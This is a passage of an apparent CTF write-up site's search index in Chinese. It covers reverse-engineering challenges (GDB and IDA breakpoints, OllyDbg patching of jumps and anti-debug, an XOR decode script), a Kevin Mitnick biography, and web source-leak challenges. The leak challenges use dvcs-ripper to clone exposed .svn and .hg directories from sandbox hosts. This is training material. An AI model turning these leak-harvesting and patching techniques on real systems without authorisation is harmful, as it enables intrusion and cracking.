\u65ad\u70b9\u8bfb\u53d6\u5bc4\u5b58\u5668","text":""},{"location":"Reverse/Chapter8/8-1/#gdb-\u65ad\u70b9\u8bfb\u53d6\u5bc4\u5b58\u5668","title":"GDB \u65ad\u70b9\u8bfb\u53d6\u5bc4\u5b58\u5668","text":"<p>IDA32 \u53cd\u7f16\u8bd1</p> <p></p> <p>\u6838\u5fc3\u51fd\u6570\u662f\u6700\u540e\u4e00\u4e2a</p> <p></p> <p>\u901a\u8fc7\u7b2c 10~13 \u884c\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 <code>s2</code> \u5c31\u662f\u6211\u4eec\u9700\u8981 flag\uff08ws \u4e3a\u8f93\u5165\u503c\uff09</p> <p>\u76f8\u540c\u5219\u6253\u5370 <code>success!</code></p> <p></p> <p>\u9f20\u6807\u653e\u5230 <code>s2 = decrypt(&amp;s, &amp;dword_8048A90);</code> \u8fd9\u4e00\u6bb5\u7136\u540e\u6309 TAB \u53cd\u7f16\u8bd1\u5373\u53ef\u81ea\u52a8\u5b9a\u4f4d\u5230\u6c47\u7f16\u4ee3\u7801\u90e8\u5206</p> <p>\u901a\u8fc7\u56fe\u4e2d\u7ea2\u6846\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 <code>eax</code> \u50a8\u5b58\u7740 <code>decryp()</code> \u51fd\u6570\u8fd4\u56de\u7684 flag \u503c\uff0c\u518d\u4fdd\u5b58\u5230 <code>s2</code></p> <p></p> <p>\u7b80\u5355\u770b\u770b <code>decryp()</code> \u51fd\u6570</p> <p></p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u6211\u4eec\u9700\u8981\u7684 flag \u4fdd\u5b58\u5728 <code>eax</code> \u4e2d</p> <p>\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06\u65ad\u70b9\u8bbe\u7f6e\u5728 <code>decrypt()</code> \u51fd\u6570\u5904\uff0c\u5355\u6b65\u6267\u884c\u540e\uff0c<code>eax</code> \u4fdd\u5b58\u7740\u6211\u4eec\u9700\u8981\u7684\u503c\uff0c\u518d\u8bfb\u53d6 <code>eax</code> \u503c\u5373\u53ef</p> <p>\u5148\u4e0b\u597d\u65ad\u70b9</p> <pre><code>pwndbg&gt; b decrypt\n</code></pre> <p></p> <p>\u6309 <code>r</code> \u6267\u884c\u5230\u65ad\u70b9</p> <p></p> <p>\u518d\u6309 <code>n</code> \u4e0d\u8ddf\u8fdb\u51fd\u6570</p> <p>\u7136\u540e\u67e5\u770b <code>eax</code> \u5bc4\u5b58\u5668\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter8/8-2/","title":"OllyDbg \u4fee\u6539\u6c47\u7f16\u6307\u4ee4","text":""},{"location":"Reverse/Chapter8/8-2/#ollydbg-\u4fee\u6539\u6c47\u7f16\u6307\u4ee4","title":"OllyDbg \u4fee\u6539\u6c47\u7f16\u6307\u4ee4","text":"<p>32IDA \u6253\u5f00</p> <p></p> <p>\u7ed9\u51fa\u4e86 if \u7ed3\u6784\uff0c\u6211\u4eec\u76f4\u63a5\u6253\u5f00\u7684\u8bdd\u662f\u6267\u884c\u662f\u7b2c\u4e00\u90e8\u5206\uff0c\u7ed9\u51fa\u4e86\u4e71\u7801</p> <p></p> <p>\u6240\u4ee5\u6211\u4eec\u8981\u8ba9\u7a0b\u5e8f\u8d70\u7b2c\u4e8c\u90e8\u5206\uff0c\u5728 OllyDbg \u4e2d\u8f7d\u5165\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u76f4 F8 \u5355\u6b65\u5411\u4e0b\u627e\u5230\u5f39\u7a97\u7684\u4f4d\u7f6e</p> <p></p> <p>\u5728\u5f39\u7a97\u4f4d\u7f6e\u8fd9\u91cc\u4e0b\u65ad\u70b9\u6309 F2</p> <p></p> <p>\u6309 Ctrl+F2 \u91cd\u65b0\u8f7d\u5165</p> <p></p> <p>\u6309 F9 \u76f4\u63a5\u8fd0\u884c\u5230\u65ad\u70b9\u4f4d\u7f6e</p> <p></p> <p>\u56e0\u4e3a\u4e0b\u4e00\u6b65\u5c31\u5f39\u7a97\u4e86\uff0c\u6240\u4ee5\u8fd9\u91cc\u5f97 F7 \u6b65\u5165\u8fdb\u53bb</p> <p> </p> <p>\u5230\u8fd9\u91cc\u6267\u884c\u53c8\u5f39\u7a97\u4e86</p> <p></p> <p>\u91cd\u65b0\u6267\u884c\u4e00\u904d\u53d1\u73b0\u6267\u884c\u4e86\u8fd9\u6761\u6307\u4ee4\u8df3\u8f6c\u5230\u4e86\u8fd9\u91cc\uff0c\u4e0b\u65ad\u70b9\u9a8c\u8bc1\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837</p> <p></p> <p>\u4f46\u662f\u4e0a\u9762\u8fd8\u6709\u4e00\u6761 JNZ \u6307\u4ee4\u5e76\u672a\u6267\u884c\uff0c\u91cd\u65b0\u6253\u65ad\u70b9\u5220\u9664\u65ad\u70b9</p> <p></p> <p>\u6211\u8fd9\u91cc\u662f\u76f4\u63a5\u6539\u4e3a <code>JMP</code> \u5f3a\u5236\u8df3\u8f6c\uff0c\u53f3\u952e\u6c47\u7f16\u6216\u8005\u76f4\u63a5\u7a7a\u683c</p> <p>\u5176\u4ed6\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <ol> <li>\u76f4\u63a5\u4fee\u6539 <code>EAX</code> \u4e3a\u975e\u96f6\u503c</li> </ol> <pre><code>MOV EAX, 1      ; EAX \u2260 0 \u2192 TEST EAX,EAX \u540e ZF=0 \u2192 JNZ \u8df3\u8f6c\n</code></pre> <ol> <li>\u76f4\u63a5\u4fee\u6539 <code>EFLAGS</code>\uff08<code>Z</code> \u6807\u5fd7\u4f4d\uff09</li> </ol> <pre><code>PUSHFD          ; \u5c06 EFLAGS \u538b\u6808\nAND DWORD PTR [ESP], ~0x40  ; \u6e05\u9664 ZF\uff08\u7b2c 6 \u4f4d\uff09\nPOPFD           ; \u6062\u590d\u4fee\u6539\u540e\u7684 EFLAGS\n</code></pre> <p></p> <p>\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u53f3\u952e\u4fee\u6539\u7684\u6307\u4ee4 -&gt; \u7f16\u8f91 -&gt; \u590d\u5236\u6240\u6709\u4fee\u6539\u5230\u53ef\u6267\u884c\u6587\u4ef6</p> <p></p> <p>\u76f4\u63a5\u66ff\u6362\u6389\u539f\u59cb\u6587\u4ef6</p> <p></p> <p>\u8fd9\u91cc\u6709\u4e2a <code>INT3</code> \u53cd\u8c03\u8bd5\uff0c<code>nop</code> \u6389</p> <p></p> <p>\u7ee7\u7eed F8 \u8d70\u5230\u8fd9\u91cc\u540e\u53c8\u6ca1\u6709\u7ed3\u679c\u4e86\uff0c\u518d\u6b21 <code>nop</code> \u6389</p> <p></p> <p>\u7ee7\u7eed F8 \u8d70\u5230 <code>call Message</code> \u8fd9\u91cc\u5f39\u7a97\u4e86\uff0c\u5ffd\u7565\u540e\u7ee7\u7eed\u8d70</p> <p>\u4e0b\u9762\u90a3\u4e2a <code>JMP</code> \u6ca1\u6709\u7ed3\u679c\u4e86\uff0c\u4e00\u6837 <code>nop</code></p> <p></p> <p>\u8d70\u5230\u8fd9\u4e00\u6b65\u65f6 flag \u5df2\u7ecf\u51fa\u6765\u4e86</p> <p></p> <p>\u770b\u6307\u4ee4 <code>PUSH EAX</code> \u5e94\u8be5\u662f\u5c06 flag \u653e\u5165\u4e86 <code>EAX</code> \u4e2d\uff0c\u53f3\u952e\u8ddf\u968f\u503c\u53ef\u4ee5\u5728\u53f3\u4e0b\u89d2\u770b\u5230 flag</p> <p></p> <p>\u5f80\u540e\u9762\u7ee7\u7eed\u8d70\u4e5f\u662f\u5f39\u7a97\u7ed9\u51fa\u4e86 flag</p> <p></p>"},{"location":"Reverse/Chapter8/8-3/","title":"IDA \u65ad\u70b9\u8bfb\u53d6\u5185\u5b58","text":""},{"location":"Reverse/Chapter8/8-3/#ida-\u65ad\u70b9\u8bfb\u53d6\u5185\u5b58","title":"IDA \u65ad\u70b9\u8bfb\u53d6\u5185\u5b58","text":"<p>\u6ca1\u58f3</p> <p></p> <p>\u53cd\u7f16\u8bd1\u4f2a\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0 <code>a[]</code> \u4e2d\u5b58\u653e\u7684\u5c31\u662f flag</p> <p></p> <p>\u91c7\u53d6\u52a8\u6001\u8c03\u8bd5\u83b7\u53d6 flag\uff0c\u5728\u6700\u540e <code>return 0</code> \u5904\u6253\u65ad\u70b9</p> <p></p> <p>\u53f3\u4e0a\u89d2 Debugger \u2192 Select Debugger\uff0c\u9009\u62e9\u7b2c\u4e09\u4e2a</p> <p></p> <p>\u518d\u6309 F9 \u8fd0\u884c\uff08\u83dc\u5355\u680f\u9009\u62e9 Debugger \u2192 Use source-level debugging\uff0c\u786e\u4fdd\u6b64\u9879\u88ab\u6253\u94a9\uff09</p> <p></p> <p>\u5148\u968f\u4fbf\u8f93\u5165\u7136\u540e\u56de\u8f66\u65ad\u4f4f</p> <p></p> <p>F5 \u53cd\u7f16\u8bd1\u540e\u53cc\u51fb <code>unk_403040</code> \u53ef\u4ee5\u770b\u5230\u5b57\u7b26\u4e32\u4e86</p> <p></p> <p>\u518d\u5199\u811a\u672c</p> <pre><code>a = [0x66,0x6D,0x63,0x64,0x7F,0x64,0x32,0x36,0x6A,0x6C,0x3E,0x3D,0x39,0x20,0x6F,0x3A,0x20,0x77,0x3F,0x27,0x25,0x27,0x22,0x3A,0x7A,0x2E,0x78,0x7A,0x31,0x2F,0x29,0x29,0x16,0x40,0x44,0x45,0x12,0x47,0x47,0x41,0x1A,0x54]\nc = ''\nb = 0\nfor i in a:\n    c += chr(b ^ i)\n    b += 1\nprint(c)\n</code></pre>"},{"location":"Reverse/Chapter9/9-1/","title":"Jar \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter9/9-1/#jar-\u53cd\u7f16\u8bd1","title":"Jar \u53cd\u7f16\u8bd1","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u540e\u7528 Jadx \u53cd\u7f16\u8bd1</p> <p></p> <p>\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0c\u91cd\u70b9\u627e\u8ddf114\u6709\u5173\u7684\u4ee3\u7801\u6bb5</p> <p>\u610f\u601d\u5c31\u662f\u5982\u679c score \u5927\u4e8e\u7b49\u4e8e 114\uff0c\u5c31\u4ece statics \u76841919810 \u4e2d\u8bfb\u5165 114514 \u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u4e2d\u6240\u6709\u7684\u6570\u636e\u8ddf\u5341\u8fdb\u5236\u7684 88 \u8fdb\u884c\u5f02\u6216</p> <p></p> <p>\u627e\u5230 114514 \u6587\u4ef6\uff0c\u7528 010 \u5c06\u6240\u6709\u7684\u6570\u636e\u4e0e 0x58\uff08\u5341\u516d\u8fdb\u5236\u7684 88\uff09\u8fdb\u884c\u5f02\u6216\uff0c\u5f97\u5230\u4e00\u5f20\u7f3a\u5c11\u5b9a\u4f4d\u70b9\u7684\u4e8c\u7ef4\u7801</p> <p></p> <p>\u8865\u9f50\u5b9a\u4f4d\u7b26\u62ff\u5230 flag</p> <p></p>"},{"location":"Tools/","title":"\u4ecb\u7ecd","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Web/","title":"\u4ecb\u7ecd","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Web/Chapter1/","title":"Index","text":""},{"location":"Web/Chapter1/#kevin-mitnick","title":"Kevin Mitnick","text":"<p>\u7f8e\u56fd\u4eba Kevin Mitnick \u582a\u79f0\u9ed1\u5ba2\u9f3b\u7956\uff0c\u4ed6\u7684\u9ed1\u5ba2\u751f\u6daf\u59cb\u4e8e\u5c11\u5e74\u65f6\u671f\u3002</p> <p>1979 \u5e74\uff0c\u4fb5\u5165\u4e86 DEC \u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5e76\u590d\u5236\u4e86\u8be5\u516c\u53f8\u7684\u8f6f\u4ef6\u5e76\u4e8e 1988 \u5e74\u56e0\u8fd9\u4e00\u7f6a\u884c\u88ab\u6307\u63a7\u5e76\u5b9a\u7f6a\u3002\u4ed6\u88ab\u5224\u5904 12 \u4e2a\u6708\u76d1\u7981\uff0c\u968f\u540e\u63a5\u53d7\u4e09\u5e74\u7684\u76d1\u5916\u770b\u7ba1</p> <p>\u76d1\u5916\u770b\u7ba1\u671f\u5373\u5c06\u7ed3\u675f\u4e4b\u9645\uff0cKevin Mitnick \u5165\u4fb5\u4e86\u592a\u5e73\u6d0b\u8d1d\u5c14\u8bed\u97f3\u4fe1\u7bb1\u8ba1\u7b97\u673a\u3002\u5728\u902e\u6355\u4ee4\u53d1\u51fa\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6f5c\u9003\uff0c\u5728\u9003\u4ea1\u4e86\u4e24\u5e74\u534a</p> <p>\u5728\u9003\u671f\u95f4\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u4e86\u6570\u5341\u4e2a\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u4ed6\u4f7f\u7528\u514b\u9686\u7684\u624b\u673a\u9690\u85cf\u81ea\u5df1\u7684\u4f4d\u7f6e</p> <p>\u5728\u4ed6\u7684\u76d1\u7763\u91ca\u653e\u671f\u95f4\uff0c\u4ed6\u6700\u521d\u88ab\u7981\u6b62\u4f7f\u7528\u9664\u56fa\u5b9a\u7535\u8bdd\u4e4b\u5916\u7684\u4efb\u4f55\u901a\u8baf\u6280\u672f</p> <p>2000 \u5e74\u83b7\u91ca\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6210\u4e3a\u4e00\u540d\u6709\u507f\u5b89\u5168\u987e\u95ee\u3001\u516c\u4f17\u6f14\u8bb2\u8005\u548c\u4f5c\u5bb6\u3002\u4ed6\u4e3a\u516c\u53f8\u548c\u653f\u5e9c\u673a\u6784\u63d0\u4f9b\u5b89\u5168\u54a8\u8be2\u3001\u6e17\u900f\u6d4b\u8bd5\u670d\u52a1\u5e76\u6559\u6388\u793e\u4f1a\u5de5\u7a0b\u5b66\u8bfe\u7a0b</p> <p>Kevin Mitnick \u4e8e 2023 \u5e74 7 \u6708 16 \u65e5\u5728\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u5339\u5179\u5821\u4e00\u5bb6\u533b\u9662\u56e0\u80f0\u817a\u764c\u53bb\u4e16</p> <p></p>"},{"location":"Web/Chapter1/1-1/","title":"\u4ee3\u7801\u6ce8\u91ca\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-1/#\u4ee3\u7801\u6ce8\u91ca\u6cc4\u9732","title":"\u4ee3\u7801\u6ce8\u91ca\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u4e00\u5806\u6ed1\u7a3d\u7b11\u8138</p> <p></p> <p>F12 \u67e5\u770b\u6e90\u4ee3\u7801\u62ff\u5230\u6ce8\u91ca\u4e2d\u7684 flag</p> <p></p>"},{"location":"Web/Chapter1/1-10/","title":".DS_Store \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-10/#ds_store-\u6587\u4ef6\u6cc4\u9732","title":".DS_Store \u6587\u4ef6\u6cc4\u9732","text":"<p><code>.DS_Store</code> \u662f MacOS \u4fdd\u5b58\u6587\u4ef6\u5939\u7684\u81ea\u5b9a\u4e49\u5c5e\u6027\u7684\u9690\u85cf\u6587\u4ef6</p> <p>\u901a\u8fc7 <code>.DS_Store</code> \u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u6240\u6709\u6587\u4ef6\u7684\u6e05\u5355</p> <p>\u8bbf\u95ee\u4e0b\u8f7d\u6587\u4ef6</p> <pre><code>http://challenge-925075ffed70f5ad.sandbox.ctfhub.com:10800/.DS_Store\n</code></pre> <p>\u4f7f\u7528\u5de5\u5177\u89e3\u6790\u6587\u4ef6</p> <p></p> <p>\u518d\u901a\u8fc7 curl \u8bbf\u95ee</p> <p></p>"},{"location":"Web/Chapter1/1-11/","title":".svn \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-11/#svn-\u6587\u4ef6\u6cc4\u9732","title":".svn \u6587\u4ef6\u6cc4\u9732","text":"<p>\u626b\u63cf\u53d1\u73b0\u6709 <code>.svn/</code> \u76ee\u5f55\uff0c\u786e\u8ba4\u662f  <code>.svn</code>  \u6cc4\u9732</p> <p>\u4f7f\u7528 <code>dvcs-ripper</code> \u5de5\u5177\u4e2d\u7684 <code>rip-svn.pl</code> \u811a\u672c\u8fdb\u884c clone</p> <pre><code>perl rip-svn.pl -u http://challenge-f54504e10cb99eb1.sandbox.ctfhub.com:10800/.svn/\n</code></pre> <p></p> <p>1\ufe0f\u20e3 <code>entries</code></p> <p>\u4ec5\u5728\u65e7\u7248\u672c SVN\uff081.6 \u53ca\u4ee5\u524d\uff09\u6709\u7528\uff0c\u65b0\u7248\u5e9f\u5f03</p> <ul> <li>\u4f5c\u7528\uff1a\u65e7\u7248 SVN \u7684\u76ee\u5f55\u3001\u6587\u4ef6\u3001\u72b6\u6001\u4fe1\u606f\u8bb0\u5f55\uff08\u7248\u672c\u53f7 / \u4fee\u6539 / \u662f\u5426\u5ffd\u7565 / \u8def\u5f84\u5173\u7cfb\u7b49\uff09</li> <li>\u5185\u5bb9\uff1a\u4f2a XML \u683c\u5f0f\u6216\u7eaf\u6587\u672c</li> <li>\u5386\u53f2\u9057\u7559\uff0c\u73b0\u4ee3 1.7+ \u4f7f\u7528 <code>wc.db</code> \u66ff\u4ee3</li> </ul> <pre><code>plaintext\u590d\u5236\u7f16\u8f91dir\n9\nhttps://svn.example.com/repo\n...\n</code></pre> <p>2\ufe0f\u20e3 <code>format</code></p> <p>\u4f5c\u7528\uff1a\u6807\u8bc6\u5f53\u524d <code>.svn</code> \u76ee\u5f55\u7684\u5143\u6570\u636e\u7248\u672c</p> \u6570\u5b57 \u610f\u4e49 \u5bf9\u5e94\u7248\u672c 8 SQLite\uff08wc.db\uff09 1.7 12 1.8 29 1.9 ... ... <p>\u4e3e\u4f8b\u5185\u5bb9\uff1a</p> <pre><code>12\n</code></pre> <p>\u8868\u793a\u8be5\u5de5\u4f5c\u526f\u672c\u662f SVN 1.8 \u7248\u672c\u683c\u5f0f</p> <p>3\ufe0f\u20e3 <code>pristine/</code></p> <p>\u6838\u5fc3\uff1a\u6587\u4ef6\u5185\u5bb9\u4ed3\u5e93</p> <ul> <li>\u4fdd\u5b58\u4e86**\u6240\u6709\u5e72\u51c0\u7248\u672c\u7684\u6e90\u6587\u4ef6\uff08\u672a\u4fee\u6539\u7684\u539f\u59cb\u7248\u672c\uff09**</li> <li>\u6587\u4ef6\u540d\u662f\u901a\u8fc7 <code>SHA1 \u54c8\u5e0c</code> \u91cd\u547d\u540d\u540e\u7684\uff0c\u9632\u6b62\u51b2\u7a81\u3001\u5229\u4e8e\u67e5\u627e</li> </ul> <pre><code>.svn/pristine/ab/cd/abcdef1234567890.svn-base\n</code></pre> <ul> <li>\u4f5c\u7528\uff1a\u7528\u4e8e\u5bf9\u6bd4\u5de5\u4f5c\u533a\u662f\u5426\u6539\u52a8</li> <li>\u672c\u8d28\uff1a\u5b58\u50a8\u7684\u662f**\u672a\u88ab\u7f16\u8f91\u7684\u539f\u59cb\u7248\u672c**\uff0c\u7c7b\u4f3c Git \u7684 <code>objects/</code></li> </ul> <p>4\ufe0f\u20e3 <code>text-base/</code></p> <p>1.6 \u4ee5\u524d\u65e7\u7ed3\u6784\uff0c\u73b0\u4ee3 SVN \u4e0d\u518d\u4f7f\u7528\u3002</p> <ul> <li>\u4fdd\u5b58\u6e05\u7406\u7f13\u5b58\u7684\u57fa\u7ebf\u5185\u5bb9\uff0c <code>.svn-base</code> \u540e\u7f00</li> <li>\u6bcf\u4e2a\u5de5\u4f5c\u533a\u6587\u4ef6\u5bf9\u6bd4\u6539\u52a8\u65f6\u7528</li> <li>\u4e0e <code>pristine/</code> \u76f8\u4f3c\uff0c\u4f46\u8fd9\u662f**\u65e7\u7248\u8bbe\u8ba1**</li> </ul> <p>5\ufe0f\u20e3 <code>tmp/</code></p> <p>\u4e34\u65f6\u6587\u4ef6\u76ee\u5f55</p> <ul> <li>\u6267\u884c checkout / update / revert \u65f6\u4ea7\u751f\u4e34\u65f6\u6570\u636e</li> <li>\u7c7b\u4f3c\u4e8e <code>.git/objects/tmp</code></li> <li>\u610f\u5916\u4e2d\u65ad\u64cd\u4f5c\u540e\u53ef\u5b89\u5168\u5220\u9664</li> </ul> <p>6\ufe0f\u20e3 <code>wc.db</code></p> <p>SQLite \u6570\u636e\u5e93\uff0c\u73b0\u4ee3 SVN \u7684\u6838\u5fc3</p> <ul> <li>\u4f5c\u7528\uff1a\u8bb0\u5f55\u6240\u6709\u5143\u6570\u636e\u4fe1\u606f</li> <li>\u7c7b\u578b\uff1a\u6807\u51c6 SQLite \u6570\u636e\u5e93</li> <li>\u5305\u542b\u5185\u5bb9\uff1a</li> <li>\u4ed3\u5e93\u4fe1\u606f\uff08URL / UUID / \u6839\u8def\u5f84\uff09</li> <li>\u5404\u6587\u4ef6\u72b6\u6001\uff08\u7248\u672c / \u662f\u5426\u4fee\u6539 / lock \u4fe1\u606f\uff09</li> <li>\u5404\u76ee\u5f55\u4e0e\u7248\u672c\u53f7\u6620\u5c04</li> <li>\u76ee\u5f55\u6811\u5c42\u7ea7\u5173\u7cfb</li> <li>pristine \u54c8\u5e0c\u7d22\u5f15</li> </ul> <p>\u53ef\u4ee5\u7528 <code>sqlite3 wc.db .tables</code> \u67e5\u770b\u8868\uff1a</p> \u8868 \u542b\u4e49 NODES \u5404\u4e2a\u8282\u70b9\uff08\u76ee\u5f55\u3001\u6587\u4ef6\uff09\u72b6\u6001 ACTUAL_NODE \u5de5\u4f5c\u533a\u5b9e\u9645\u72b6\u6001\uff08\u51b2\u7a81\u3001\u5c5e\u6027\uff09 REPOSITORY \u4ed3\u5e93\u4fe1\u606f PRISTINE \u54c8\u5e0c\u8868\u6620\u5c04\u81f3 pristine \u76ee\u5f55 LOCK \u9501\u4fe1\u606f WC_LOCK \u5de5\u4f5c\u76ee\u5f55\u9501 <p>\ud83d\udc49 \u6838\u5fc3\uff1a\u5de5\u4f5c\u526f\u672c\u7684\u5b9e\u9645\u72b6\u6001\u90fd\u5728\u8fd9\u91cc\uff01</p> <p>7\ufe0f\u20e3 <code>wc.db-journal</code></p> <p>SQLite \u6570\u636e\u5e93\u7684 \u4e8b\u52a1\u65e5\u5fd7</p> <ul> <li>\u7a81\u7136\u65ad\u7535\u3001\u8fdb\u7a0b\u5d29\u6e83\uff0c\u672a\u63d0\u4ea4\u4e8b\u52a1\u4fdd\u7559\u5728\u8fd9\u91cc</li> <li>\u6b63\u5e38\u5173\u95ed\u540e\u81ea\u52a8\u6d88\u5931\uff0c\u6b64\u5904\u4e3a\u4e34\u65f6\u9057\u7559\u65e0\u5f71\u54cd</li> <li>\u5982\u679c\u4e00\u76f4\u5b58\u5728\u53ef\u80fd\u8868\u793a\u8be5\u5de5\u4f5c\u533a\u672a\u6b63\u5e38\u5173\u95ed</li> </ul> <p></p> <p>\u627e\u5230 flag</p> <p></p>"},{"location":"Web/Chapter1/1-12/","title":".hg \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-12/#hg-\u6587\u4ef6\u6cc4\u9732","title":".hg \u6587\u4ef6\u6cc4\u9732","text":"<p>\u626b\u63cf\u53d1\u73b0\u6709 <code>.hg/</code> \u76ee\u5f55\uff0c\u786e\u8ba4\u662f  <code>.hg</code>  \u6cc4\u9732</p> <p>\u4f7f\u7528 <code>dvcs-ripper</code> \u5de5\u5177\u4e2d\u7684 <code>rip-hg.pl</code> \u811a\u672c\u8fdb\u884c clone</p> <pre><code>perl rip-hg.pl -u http://challenge-01f03d0aee8e33f2.sandbox.ctfhub.com:10800/.hg/\n</code></pre> <p></p> <p>1\ufe0f\u20e3 00changelog.i</p> <ul> <li>\u4f5c\u7528\uff1a\u5b58\u50a8\u63d0\u4ea4\u5386\u53f2\uff08changelog\uff09\u7684\u7d22\u5f15\u4fe1\u606f</li> <li>\u5185\u5bb9\uff1a\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u6307\u5411\u5b9e\u9645\u5b58\u50a8\u5185\u5bb9\uff08\u901a\u5e38\u5728 <code>store/data</code> \u5185\u7684 <code>.i</code> / <code>.d</code> \u6587\u4ef6\uff09</li> <li>\u7406\u89e3\uff1a\u7c7b\u4f3c Git \u7684 <code>refs</code>\uff0c\u7528\u4e8e\u8ffd\u8e2a\u53d8\u66f4\u96c6\u5143\u4fe1\u606f\u7684\u4f4d\u7f6e</li> <li>\u6269\u5c55\uff1a\u5982\u679c\u88ab\u5220\uff0c\u4ed3\u5e93\u5386\u53f2\u7248\u672c\u5c31\u4f1a\u65ad\u88c2\u4e0d\u53ef\u6062\u590d</li> </ul> <p>2\ufe0f\u20e3 dirstate</p> <ul> <li>\u4f5c\u7528\uff1a\u8ddf\u8e2a\u5f53\u524d\u5de5\u4f5c\u533a\uff08Working Directory\uff09\u7684\u72b6\u6001</li> <li>\u5185\u5bb9\uff1a\u8bb0\u5f55\u54ea\u4e9b\u6587\u4ef6\u88ab\u8ffd\u8e2a\uff0c\u54ea\u4e9b\u88ab\u4fee\u6539\u3001\u6dfb\u52a0\u3001\u5220\u9664</li> <li>\u7406\u89e3\uff1aMercurial \u4f7f\u7528\u5b83\u6765\u5feb\u901f\u5224\u65ad <code>status</code></li> <li>\u7ed3\u6784\uff1a\u4e8c\u8fdb\u5236\uff0c\u5305\u542b\uff1a</li> <li>\u5f53\u524d\u7236\u63d0\u4ea4\u8282\u70b9 ID</li> <li>\u6587\u4ef6\u72b6\u6001\uff08\u6b63\u5e38 / \u4fee\u6539 / \u5220\u9664 / \u6dfb\u52a0 / \u5ffd\u7565 / \u672a\u8ffd\u8e2a\uff09</li> <li>\u65f6\u95f4\u6233\u7f13\u5b58\u4fe1\u606f\u7b49</li> </ul> <p>3\ufe0f\u20e3 last-message.txt</p> <ul> <li>\u4f5c\u7528\uff1a\u8bb0\u5f55\u6700\u8fd1\u4e00\u6b21\u63d0\u4ea4\u4fe1\u606f\u7684\u63d0\u4ea4\u8bf4\u660e</li> <li>\u5185\u5bb9\uff1a\u7eaf\u6587\u672c\uff0c\u901a\u5e38\u662f\u6700\u8fd1\u4e00\u6b21 <code>hg commit -m '...'</code> \u7684\u5185\u5bb9</li> <li>\u7528\u9014\uff1a\u8f85\u52a9\u64a4\u9500\u3001\u6062\u590d\u64cd\u4f5c</li> </ul> <p>4\ufe0f\u20e3 requires</p> <ul> <li> <p>\u4f5c\u7528\uff1a\u5217\u51fa\u8be5\u4ed3\u5e93\u6240\u4f9d\u8d56\u7684 Mercurial \u529f\u80fd\u6a21\u5757</p> </li> <li> <p>\u5185\u5bb9\uff1a\u6587\u672c\u683c\u5f0f\uff0c\u6bcf\u884c\u4e00\u4e2a\u6a21\u5757\u540d\u3002\u4f8b\u5982\uff1a</p> </li> </ul> <pre><code>revlogv1\nstore\nfncache\n</code></pre> <ul> <li> <p>\u5f71\u54cd\uff1aMercurial \u542f\u52a8\u4ed3\u5e93\u65f6\u8bfb\u53d6\u5b83\uff0c\u786e\u4fdd\u517c\u5bb9\u6027</p> </li> <li> <p>\u5e38\u89c1\u503c\uff1a</p> </li> <li> <p><code>revlogv1</code>\uff1a\u4f7f\u7528 revlog \u7b2c\u4e00\u7248\u683c\u5f0f</p> </li> <li><code>store</code>\uff1a\u6570\u636e\u5728 <code>.hg/store</code></li> <li><code>fncache</code>\uff1a\u6587\u4ef6\u540d\u7f13\u5b58\u673a\u5236\uff08\u907f\u514d\u8def\u5f84\u8fc7\u957f\uff09</li> </ul> <p>5\ufe0f\u20e3 undo.branch</p> <ul> <li>\u4f5c\u7528\uff1a\u8bb0\u5f55 <code>undo</code> \u64cd\u4f5c\u65f6\u6062\u590d\u7684\u5206\u652f</li> <li>\u5185\u5bb9\uff1a\u7eaf\u6587\u672c\uff0c\u5206\u652f\u540d</li> <li>\u7528\u9014\uff1a\u64a4\u9500\u5230\u8be5\u5206\u652f</li> </ul> <p>6\ufe0f\u20e3 undo.desc</p> <ul> <li>\u4f5c\u7528\uff1a\u8bb0\u5f55 <code>undo</code> \u7684\u63cf\u8ff0\u4fe1\u606f</li> <li>\u5185\u5bb9\uff1a\u7eaf\u6587\u672c\uff0c\u6bd4\u5982 \"update\"\u3001\"revert\"</li> <li>\u7528\u9014\uff1a\u63d0\u793a\u4f60\u64a4\u9500\u4e86\u4ec0\u4e48\u64cd\u4f5c</li> </ul> <p>7\ufe0f\u20e3 undo.dirstate</p> <ul> <li>\u4f5c\u7528\uff1a\u64a4\u9500\u65f6\u4f7f\u7528\u7684 <code>dirstate</code> \u5feb\u7167</li> <li>\u5185\u5bb9\uff1a\u4e8c\u8fdb\u5236\uff0c\u540c <code>dirstate</code> \u683c\u5f0f</li> <li>\u7528\u9014\uff1a<code>hg undo</code> \u65f6\u6062\u590d\u5de5\u4f5c\u76ee\u5f55\u72b6\u6001</li> </ul> <p>8\ufe0f\u20e3 store/</p> <ul> <li>\u4f5c\u7528\uff1a\u5b58\u50a8\u4ed3\u5e93\u6240\u6709\u7248\u672c\u6570\u636e\u7684\u6838\u5fc3\u76ee\u5f55</li> <li>\u5185\u5bb9\uff1a</li> <li><code>00manifest.i</code>: \u8ddf\u8e2a\u6e05\u5355\uff08manifest\uff09\u7684\u7d22\u5f15</li> <li><code>data/</code>: 